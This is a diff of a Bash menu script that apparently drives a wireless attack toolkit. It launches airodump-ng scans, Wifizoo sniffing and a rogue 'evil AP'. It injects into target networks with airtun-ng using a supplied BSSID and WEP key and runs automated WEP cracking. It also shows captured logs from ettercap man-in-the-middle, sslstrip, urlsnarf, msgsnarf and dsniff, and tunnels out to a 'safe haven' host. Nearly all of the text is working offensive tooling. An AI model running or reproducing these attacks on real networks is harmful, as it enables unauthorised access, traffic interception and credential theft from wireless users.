+	check_if_online $SAFEHAVEN 
+        if [ $? -gt 0 ]; then echo  -e ""$RED"I can't ping $SAFEHAVEN. Aborting SSH tunnel creation!"$END"";  echo -ne ""$MAGENTA"Press <CR>"$END""; read blah;
+
+        else
+	   echo -e "Running: $screen -S SSHtunnel_$SAFEHAVEN $ssh $SAFEHAVEN -l $SSHUSER -p $SSHPORT $SSHPARAMETERS"
+	   echo "Use <CTRL-A-D> to return to the main menu while keeping the ssh connection running."
+	   echo "Use <CTRL-C> to abort the SSH connection attempt."
+	   echo -ne ""$MAGENTA"Press <CR> now to proceed."$END" "
+	   read blah
+	   $screen -S SSHtunnel_$SAFEHAVEN $ssh $SAFEHAVEN -l $SSHUSER -p $SSHPORT $SSHPARAMETERS
+	  echo -en ""$MAGENTA"All done. Press <CR>"$END""
+	 read blah
+        fi
+	;;
+	9)
+	echo -e ""$CYAN"Starting SSH to $DNSTUNNELNET.1...."$END""
+	check_if_online $DNSTUNNELNET.1 
+        if [ $? -gt 0 ]; then echo  -e ""$RED"I can't ping $DNSTUNNELNET.1. Aborting SSH tunnel creation!"$END"";  echo -ne ""$MAGENTA"Press <CR>"$END""; read blah;
+        else
+	   echo -e ""$MAGENTA"Running: $screen -S SSHtunnel_$SAFEHAVEN $ssh $SAFEHAVEN -l $SSHUSER -p $SSHPORT $SSHPARAMETERS"$END""
+	   echo "Use <CTRL-A-D> to return to the main menu while keeping the ssh connection running."
+	   echo "Use <CTRL-C> to abort the SSH connection attempt."
+	   echo -ne ""$MAGENTA"Press <CR> now to proceed"$END""
+	   read blah
+	   $screen -S SSHTunnel_via_DNSTunnel $ssh $DNSTUNNELNET.1 -l $SSHUSER -p $SSHPORT $SSHPARAMETERS
+	 echo -en ""$MAGENTA"All done. Press <CR>"$END""
+	 read blah
+	fi
+	;;
+	10)
+	if [ -f $OPENVPN ]; then
+	 echo "Starting OpenVPN tunnel to $SAFEHAVEN with this configuration:"
+	 echo "$OPENVPNCONF"
+	 echo "Use <CTRL-A-D> to release screen. The tunnel will stay online."
+	 echo -ne ""$MAGENTA"Press <CR> now to proceed"$END""
+	$screen -S openvpn_to_$SAFEHAVEN $OPENVPN --config $OPENVPNCONF
+	else
+          echo -e ""$RED"Can't find $OPENVPN. Aborting...."$END""
+          echo "You might want to check out: http://www.openvpn.net"
+          echo -ne ""$MAGENTA"Press <CR>"$END""
+          read blah
+        fi
+
+	;;
+
+
+#	12) 
+#	if [ -f $OZYMANDNS ]; then 
+#	echo "Starting OzymanDNS Tunnel ...."
+#	echo "Using $DNSTUNNELDOMAIN as target DNS name"
+#	echo "After tunnel creation, adding the following SSH port forwardings:"
+## FIX ME, add config file
+#	echo "Port 20132 -> 10.0.33.1 Web Proxy"
+#	echo "Will run now: $screen $ssh -L 10131:10.0.33.3:3128 -C -o ProxyCommand="$OZYMANDNS -v sshdns.$DNSTUNNELDOMAIN" localhost"
+#	   echo ""$MAGENTA"Press <CTRL-A-D> "$END"to keep the DNS tunnel connection running and return to the main menu"
+#	echo -n "Press any key to continue"
+#	read
+#	$screen $ssh -L 20132:10.0.33.3:3128 -C -o ProxyCommand="$OZYMANDNS -v sshdns.$DNSTUNNELDOMAIN" localhost
+#	read blah
+#	else echo -n "Cant find $OZYMANDNS. Aborting....Press any key."; read blah; fi
+#	;;
+	11) pick_wireless_interface
+	;;
+	12)
+	 cleanup_system $wifi 
+  	 echo -en ""$GREEN"Clean up done. Press <CR>"$END""
+	 read blah
+	;;
+	13) echo "Changing diversity for interface $wifi "
+		get_antenna_settings $wifi
+		echo "Choose setting!"
+		echo -n "TX{0/1/2/3}: "
+		read t
+		echo -n "RX{0/1/2/3}: "
+		read r
+		echo -n "Diversity{on=1/off=0}: "
+		read d
+		(sysctl -w dev.$wifi.txantenna=$t 
+		 sysctl -w dev.$wifi.rxantenna=$r 
+		 sysctl -w dev.$wifi.diversity=$d) | tr '\n' ' '|sed s/dev.$wifi.//g
+		echo -ne ""$MAGENTA"Press <CR>"$END""
+		read
+	;;
+	14) set_wifi_driver $wifi
+	;;
+	15) echo -e ""$CYAN"Scanning the surrounding"$END""
+          create_wireless_interface $wifi monitor RANDOM
+          if [ $? != 0 ]; then
+             echo -e ""$RED"Interface does not support monitoring mode. Using station mode."$END""
+             create_wireless_interface $wifi station RANDOM
+             if [ $? != 0 ]; then
+                echo -e ""$RED"Somthing went wrong! Cannot create wireless station interface."$END""
+                #return 1
+             fi
+             echo -e ""$GREEN"Using standard scanning method"$END""
+             iwlist $newint scanning
+	     echo -en ""$MAGENTA"Press <CR>"$END""
+	     read blah
+          else
+             echo -e "Press <CTRL-C> once to abort airodump"
+             echo -e "or use <CTRL-A-D> to keep it running. "
+             echo -e "You can resume it at the screens section of the main menu."
+             echo -en ""$MAGENTA"Which channel do you want to listen on [1-14]/<CR> for channel hopping: "$END""
+             read chan
+             if [ x$chan = x ]; then
+                $screen -S airodump-ng_on_$newint $airodump -w $TMP/airodump.TMP  $newint
+             else
+                $screen -S airodump-ng_channel_$chan_on_$newint $airodump -w $TMP/airodump.TMP -c $chan --showack $newint
+             fi
+          fi
+        ;;
+
+	15)
+	  wifi_submenu
+	;;
+	16)
+  	 chann=6
+  	 echo -en ""$MAGENTA"Which channel do you want Wifizoo to listen on [1-14 or <CR>]?: "$END""
+  	 read chann
+  	 if [ $DEBUG = "ON" ]; then echo "DEBUG: 1.chann=$chann"; fi
+  	 create_wireless_interface $wifi monitor ${chann}
+  	 if [ $DEBUG = "ON" ]; then echo "DEBUG: 2.chann=$chann"; fi
+   	 if [ $? != 0 ]; then 
+    	    echo -e ""$RED"Something went wrong! Cannot create monitor mode interface."$END"" 
+  	 else	
+	    start_wifizoo $newint
+  	 fi
+	;;
+        17)
+	 echo -e ""$CYAN"Killing Wifizoo listeners...."$END""
+         ps -eaf | grep -v grep | grep wifizoo.py | awk '{print $2}' | xargs kill >> $LOGFILE 2>&1 
+	 echo -en ""$MAGENTA"All done. Press <CR>"$END""
+         read blah
+	;;
+	18)
+        start_evilap
+	;;
+	19)
+        stop_evilap
+	;;
+	20) echo -e ""$CYAN"Starting an airtun-ng tunnel"$END""
+        echo -e "You need to do some information gathering beforehand."
+	echo -e "Run e.g. airodump to get the access point's MAC (BSSID)"
+	echo -e "and the channel it is operating on."
+	echo -e "For a successful tunnel connection the client's IP and netmask must be identified."
+	echo -e "These information need to be put in one of the wireless config files located here:"$BLUE" $LOGFOLDER"$END""
+	echo -e "(Check out the template *.wifi files)"
+	echo -e "or being provided on the command line."
+	echo -e "1) Provide information at the command line."$RED" No syntax checking yet! Be careful."$END"" 
+	echo -e "2) Read configuration files" 
+	echo -en ""$MAGENTA"Your choice:"$END""
+	mychoice=99
+	read mychoice 
+	laststatus=1
+	case $mychoice in
+	1)
+           echo -en ""$MAGENTA"Provide channel to run on [1-14](no input validation!):"$END""
+	   read CHANNEL
+           echo -en ""$MAGENTA"Provide AP's or client's BSSID [00:11:22:33:44:55](no input validation!):"$END""
+	   read BSSID
+           echo -en ""$MAGENTA"WEP Key [key / NONE](no input validation!):"$END""
+	   KEYMGMT=OPEN
+	   read KEY;
+           echo -en ""$MAGENTA"Free IP from target network  [192.168.80.77](no input validation!):"$END""
+	   read IP;
+           echo -en ""$MAGENTA"Netmask of target network [255.255.255.0](no input validation!):"$END""
+	   read MASK;
+	   laststatus=0
+	;;
+	2)
+	 readconfig; laststatus=$?
+	;;
+	*) ;;
+	esac
+	if [ $laststatus = 0 ]; then
+	    if [ "x$CHANNEL" != "x" ] && [ "x$BSSID" != "x" ]; then
+		
+		create_wireless_interface $wifi monitor $CHANNEL
+		ifconfig $newint promisc
+
+	#       echo Creating wifitap interface on channel $CHANNEL
+	#       #iwconfig $newint channel $CHANNEL #not sure if that is required
+	#       rm -r /dev/net/tun
+	#       mkdir -p /dev/net
+	#       mknod /dev/net/tun c 10 200
+	#       chown root:root /dev/net/tun
+	#       chmod 600 /dev/net/tun
+	#       echo "***********************************************"
+	#       echo Once this script is finished, open a new shell and
+	#       echo execute the following command:
+	#       echo ifconfig wj0 $IP netmask $MASK mtu 1400 up
+	#       echo When you are done, just press CTRL-C and RETURN 
+	#       echo in this shell window.
+	#       echo "***********************************************"
+
+	        echo "*****************************************************"
+		echo Using channel $CHANNEL, make sure this is correct! 
+	        echo Once the tunnel interface is created, you can access  
+	        echo associated clients directly with at0 and IP $IP
+		echo Tunnel interface might differ, check the output below.
+	        echo "*****************************************************"
+		modprobe tun
+	       if [ $DEBUG = "ON" ]; then echo "KEYMGMT:$KEYMGMT KEY:$KEY"; fi 
+	       if [ "x$KEYMGMT" = xOPEN ] &&  [ "x$KEY" != "xNONE" ] && [ "x$KEY" != "x" ]; then
+	#	 $wifitap/wifitap.py -b $BSSID -i $newint -o $newint -w $KEY
+		 echo Provided WEP key: $KEY
+		 echo "Will run now: screen airtun-ng_$IP -a $BSSID -t 0 -w $KEY $newint"
+		 $screen -dmS airtun-ng_$IP_on_$newint $airtun -a $BSSID -t 0 -w $KEY $newint
+	       else
+	#	 $wifitap/wifitap.py -b $BSSID -i $newint -o $newint 
+		 echo No WEP key provided
+		 echo "Will run now: $screen -dmS airtun-ng_$IP $airtun -a $BSSID -t 0 $newint"
+		 $screen -dmS airtun-ng_$IP_on_$newint $airtun -a $BSSID -t 0 $newint
+	       fi
+	       echo "To check the airtun-ng screen use the screen section of the main menu"
+    	       echo "Bringing up tunnel interface at0: ifconfig at0 $IP netmask $MASK up"
+	       ifconfig at0 $IP netmask $MASK up >> $LOGFILE 2>&1
+	#      ifconfig wj0 $IP netmask $MASK mtu 1400 up
+	       echo "You could now ping or scan the target wireless client" 
+
+             else  echo No channel and or BSSID  provided 
+             fi   
+	else echo -e ""$RED"There was a problem"$END""
+	fi
+        echo -en ""$MAGENTA"All done. Press <CR>"$END""
+        read blah
+	;;
+
+	21)
+	  echo -e ""$CYAN"Killing all airtun-ng processes"$END""
+	  killall airtun-ng >> $LOGFILE 2>&1
+	  echo -en ""$MAGENTA"All done. Press <CR>"$END""
+          read blah
+
+	;;
+	22)
+	#if [ ! -f "$aircrackwepbuster/airodump-ng" ]; then echo -e ""$RED"Error: Modified $aircrackwepbuster/airodump-ng not found! You can't use the automatic WEP cracking script (WEPBuster). "$END"";
+	# echo -en ""$MAGENTA"Press <CR>"$END""
+        # read blah
+	#else 
+	 cleanup_system $wifi
+	 origPATH=`echo $PATH`
+	 PATH=$aircrackwepbuster:$origPATH
+	 $WEPBUSTER
+	 PATH=$origPATH
+	 echo -e ""$MAGENTA"All done. Press <CR>"$END""
+         read blah
+        #fi
+	;;
+
+	0) echo "*** Exiting ***"
+	;;
+	23) 
+	screenno=9999
+        while [ x$screenno != "x99" ]; do	
+	 screenno=9999
+	echo "Building detached screens list."
+	#uuuh, this is gonna be ugly....
+	#blow away all emptylines and controll character sed -e '/^$/d'
+	$screen -ls | dos2unix | sed -e '/^$/d' | grep -v There | grep -v Socket | awk '{print $1}' > $TMP/screens.lst
+	i=0
+	while read line; do
+		i=`expr $i + 1`
+  		echo "$i) $line"
+ 	done < $TMP/screens.lst
+	if [ $i -eq 0 ]; then 
+	 echo -e ""$MAGENTA"No detached screens found."$END""
+	 echo "99) Back to main menu" 
+	 read screenno
+        else 
+	 echo "99) Back to main menu" 
+	 echo "To return from a screen session just press <CTRL-A-D>"
+	 echo -ne ""$MAGENTA"Which screen do you want to attach to:"$END" "
+	 read screenno
+	 if [ x$screenno = "x" ] || [ $screenno -gt `cat $TMP/screens.lst | wc -l` ]; then
+	  echo "Terminal not available! Try again."
+	 else
+	   i=0; scr=""
+	   while read line; do
+  		i=`expr $i + 1`
+  		if [ $i -eq $screenno ]; then scr=$line
+		fi
+	   done < $TMP/screens.lst
+	   echo "Attaching to $scr."; 
+	   $screen -r $scr
+         fi
+	#echo -ne ""$MAGENTA"Press <CR> to proceed."$END""
+	#read blah
+	fi #i -eq 0
+	done
+	;;
+	24)
+	install_software
+	
+	;;
+	30)
+	#echo -e ""$MAGENTA"Press <CTRL-C> once to release logfile"$END" "
+	tail   $LOGFILE
+        echo -ne ""$MAGENTA"Press <CR> to proceed."$END""
+        read blah
+	;;
+	31)
+	tail   ${LOGFOLDER}ettercap_MitM.log
+        echo -ne ""$MAGENTA"Press <CR> to proceed."$END""
+        read blah
+	;;
+	32)
+	#echo If you are logged in remotely make sure a new X-Display can be opened.
+	#$screen -m -d -S ettercap_log_terminal xterm -e "tail -f  ${LOGFOLDER}ettercap_evilap.log  " &
+	#echo -e ""$MAGENTA"Press <CTRL-C> once to release logfile"$END" "
+	tail   ${LOGFOLDER}ettercap_evilap.log
+        echo -ne ""$MAGENTA"Press <CR> to proceed."$END""
+        read blah
+	;;
+	33)
+	#echo If you are logged in remotely make sure a new X-Display can be opened.
+	#$screen -m -d -S sslstrip_log_terminal xterm -e "tail -f  ${LOGFOLDER}sslstrip.log  " &
+	#echo -e ""$MAGENTA"Press <CTRL-C> once to release logfile"$END" "
+	tail   ${LOGFOLDER}sslstrip.log
+        echo -ne ""$MAGENTA"Press <CR> to proceed."$END""
+        read blah
+	;;
+	34)
+	#echo If you are logged in remotely make sure a new X-Display can be opened.
+	#$screen -m -d -S urlsnarf_log_terminal xterm -e "tail -f  ${LOGFOLDER}urlsnarf.log  " &
+	#echo -e ""$MAGENTA"Press <CTRL-C> once to release logfile"$END" "
+	tail   ${LOGFOLDER}urlsnarf.log  
+        echo -ne ""$MAGENTA"Press <CR> to proceed."$END""
+        read blah
+	;;
+	35)
+	#echo If you are logged in remotely make sure a new X-Display can be opened.
+	#$screen -m -d -S msgsnarf_log_terminal xterm -e "tail -f  ${LOGFOLDER}msgsnarf.log  " &
+	#echo -e ""$MAGENTA"Press <CTRL-C> once to release logfile"$END" "
+	tail   ${LOGFOLDER}msgsnarf.log
+        echo -ne ""$MAGENTA"Press <CR> to proceed."$END""
+        read blah
+	;;
+	36)
+	tail   ${LOGFOLDER}ferret.log
+        echo -ne ""$MAGENTA"Press <CR> to proceed."$END""
+        read blah
+	;;
+	37)
+	 tail   ${LOGFOLDER}dsniff.log
+        echo -ne ""$MAGENTA"Press <CR> to proceed."$END""
+        read blah
+	;;
+	*) option=99; 
+;;
+
+
+esac
+done
+
+
+
